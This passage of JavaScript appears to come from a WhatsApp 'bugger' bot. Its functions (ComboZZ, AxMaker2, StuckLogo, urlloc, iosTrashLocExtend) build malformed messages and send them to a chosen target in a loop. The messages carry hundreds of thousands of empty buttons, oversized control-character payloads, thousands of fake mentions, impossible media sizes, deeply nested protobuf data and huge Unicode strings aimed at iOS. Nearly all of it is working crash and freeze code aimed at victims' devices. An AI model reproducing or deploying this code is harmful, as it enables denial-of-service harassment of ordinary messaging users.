                            fileLength: 999999999,
                            pageCount: 1000,
                            mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
                            fileName: "noname.pptx",
                            fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
                            directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1779839963",
                            thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsarcznY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
                            thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
                            thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
                            jpegThumbnail: null,
                            contextInfo: {},
                            thumbnailHeight: 999,
                            thumbnailWidth: 999,
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: { text: "watashi wa nihon ikitai desu" },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const met = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "noname",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ambataukeumUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: { text: "Billyyyy javascript" },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const lag2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    locationMessage: {
                        degreesLatitude: 9999999999,
                        degreesLongitude: 9999999999
                    },
                    body: { text: "Miku.zip" },
                    nativeFlowMessage: {
                        buttons: "\0".repeat(500000)
                    }
                }
            }
        }
    };

    const lag = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "MikuHost - Executed ¡!" },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const ambataukeum = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];

    const encodeVarint = (n) => {
        const buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = (tag, data) => Buffer.concat([
        Buffer.from(tag),
        encodeVarint(data.length),
        data
    ]);

    const Payload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: ambataukeum })
    ).finish();

    const inflate = (tag, depth) => {
        let buf = Payload;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = (raw) => {
        const s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15);

    const MAX_BATCH = 1;
    const DELAY_MS = 1000;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: { text: "c++" },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                        contextInfo: {
                            quotedMessage: {
                                contactMessage: {
                                    displayName: " ",
                                    vcard: null
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: target });

        await new Promise(r => setTimeout(r, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "php", format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u000F".repeat(9000),
                            version: 3
                        },
                        contextInfo: {
                            quotedMessage: {
                                contactMessage: {
                                    displayName: " ",
                                    vcard: null
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: target });

        await new Promise(r => setTimeout(r, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "MikuHost - Executed‽!", format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(9000),
                            version: 3
                        },
                        contextInfo: {
                            quotedMessage: {
                                contactMessage: {
                                    displayName: " ",
                                    vcard: null
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: target });

        await new Promise(r => setTimeout(r, 500));

        const msg1 = generateWAMessageFromContent(target, messsge, {});
        await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id });

        const msg211 = generateWAMessageFromContent(target, met, {});
        await sock.relayMessage(target, msg211.message, { messageId: msg211.key.id });

        const msgLag2 = generateWAMessageFromContent(target, lag2, {});
        await sock.relayMessage(target, msgLag2.message, { messageId: msgLag2.key.id });

        const msgLag = generateWAMessageFromContent(target, lag, {});
        await sock.relayMessage(target, msgLag.message, { messageId: msgLag.key.id });

        for (let offset = 0; offset < jids.length; offset += MAX_BATCH) {
            const bokep = jids.slice(offset, offset + MAX_BATCH);
            const isFirst = offset === 0;

            if (!isFirst) {
                await new Promise(r => setTimeout(r, DELAY_MS));
            }

            const idx = Math.floor(offset / MAX_BATCH) + 1;
            const suffix = idx > 1 ? ('n' + idx) : 'n';
            const msgId = 'hksn' + Date.now().toString(36).toUpperCase() + suffix;

            for (let ti = 0; ti < TAGS.length; ti++) {
                const tag = TAGS[ti];
                let codes = null;

                for (let depth = 5000; depth >= 2000 && !codes; depth -= 400) {
                    try {
                        const decoded = proto.Message.decode(inflate(tag, depth));
                        proto.Message.encode(decoded).finish();
                        codes = decoded;
                    } catch (_) {}
                }

                if (!codes) continue;

                await sock.relayMessage('status@broadcast', codes, {
                    messageId: msgId,
                    statusJidList: bokep,
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: bokep.map(jid => ({
                                tag: 'to',
                                attrs: { jid },
                                content: []
                            }))
                        }]
                    }]
                });
            }
        }
    }
}

//Pemanggilan Combo
async function ComboZZ(sock, target) {
await DelayBrutalyyy(sock, target);
await CodexCrashJ(sock, target);
await StuckLogo(sock, target);
await ComboxJ(sock, target);
}

//=============[END]==============\\


async function AxMaker2(sock, target) {
  const album = await generateWAMessageFromContent(target, {
      albumMessage: {
         expectedImageCount: 99999999,
         expectedVideoCount: 0, 
      }
   }, {});
  
  const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: " #1stRaldzz€xe ", 
            format: "EXTENTION_1" 
          },
          nativeFlowResponseMessage: {
            name: "menu_options", 
            paramsJson: `{\"display_text\":\"${" ".repeat(11111)}\",\"id\":\".grockk\",\"description\":\"PnX-ID-msg.\"}`, 
            version: 3
          },
          contextInfo: {
            mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`), 
            statusAttributionType: "SHARED_FROM_MENTION",
          }, 
        }
      }
    }
  }, {});

const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " #1stRaldzz€xe ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: " ".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 8888,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

  const msg3 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 999999,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        },
        messageAssociation: {
          associationType: 1,
          parentMessageKey: album.key
        }
      }
    }
  };

  const msg4 = {
     extendedTextMessage: {
       text: "ꦾ".repeat(60000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "support@s.whatsapp.net",
                  ...Array.from(
                  { length: 1999 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ],
               messageAssociation: {
                 associationType: 1,
                 parentMessageKey: album.key
               }
             }
           }
         };

    let msg5 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: " #1stRaldzz€xe ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "carousel_message",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸",
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1
            },
            statusAttributionType: "SHARED_FROM_MENTION",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1999 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              ),
            ]
          }
        }
      }
    }
  }, {});
  
  const msg6 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(60000),
      publisher: "ꦾ".repeat(60000),
      caption: " ### ",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        }
      ],
      fileLength: "999999999",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
       remoteJid: "X",
       participant: "0@s.whatsapp.net",
       stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "0@s.whatsapp.net",
             ...Array.from({ length: 1990 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "999999999",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "support@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         },
      },
    },
  }, {});

  for (const msg of [album, msg1, msg2, msg3, msg4, msg5, msg6]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
  }
}

async function StuckLogo(sock, target) {
  const CodeC = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=EXPIRED_HASH&oe=5F000000&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: crypto.randomBytes(32).toString("base64"),
              fileLength: 9999999999999,
              height: 99999,
              width: 99999,
              mediaKey: crypto.randomBytes(32).toString("base64"),
              fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
              directPath: "/m1/v/t24/00002299291718920200291920729100",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
              caption: "nani desuka?",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999987899999999999999,
                998999999999999999999,
                999899999999999999999,
                9998789999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: {
                 text: "— Heksen - Jahat#",
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 450000 }, () => ({}))
                    }
                }
            }
        }
    };

  const msg = generateWAMessageFromContent(target, CodeC, {});

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
}


async function urlloc(client, target) { 
  const triggerUI = "ꦾ".repeat(61111);
  await client.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 99999e99999,
        degreesLongitude: -99999e99999,
        name: "‼️⃟ ༚ ./rãldzavgrs.   " + triggerUI,
        inviteLinkGroupTypeV2: "DEFAULT",
        merchantUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        url: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        thumbnailUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        waWebSocketUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        mediaUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        sourceUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        originalImageUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        clickToWhatsappCall: true,
        contextInfo: {
          remoteJid: `${"@s.whatsapp.net"}`,
          participant: "13135550002@s.whatsapp.net",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING"
          },
          externalAdReply: {
            quotedAd: {
              advertiserName: triggerUI,
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
              caption: "‼️⃟ ༚ ./rãldzavgrs.   " + triggerUI,
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          },
          mentionedJid: [
            target,
            "0@s.whatsapp.net",
            "13135550002@s.whatsapp.net",
            ...Array.from(
            { length: 1990 },
            () =>
            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
              ],
          stanzaId: client.generateMessageTag(),
          virtexId: client.generateMessageTag(),
          quotedMessage: {
            paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: -99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999e999999999999999999999999999999999999999999999999999999999999999 * 999999999999999999999999999999999999999999999999999999999e99999999999
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
};

async function iosTrashLocExtend(sock, target) {
const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿".repeat(60000); 
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://whatsappx-ios.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }

      let extendMsg = {
         extendedTextMessage: { 
            text: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + TrashIosx, 
            matchedText: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰr4Ldz`impõssible. ✩",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
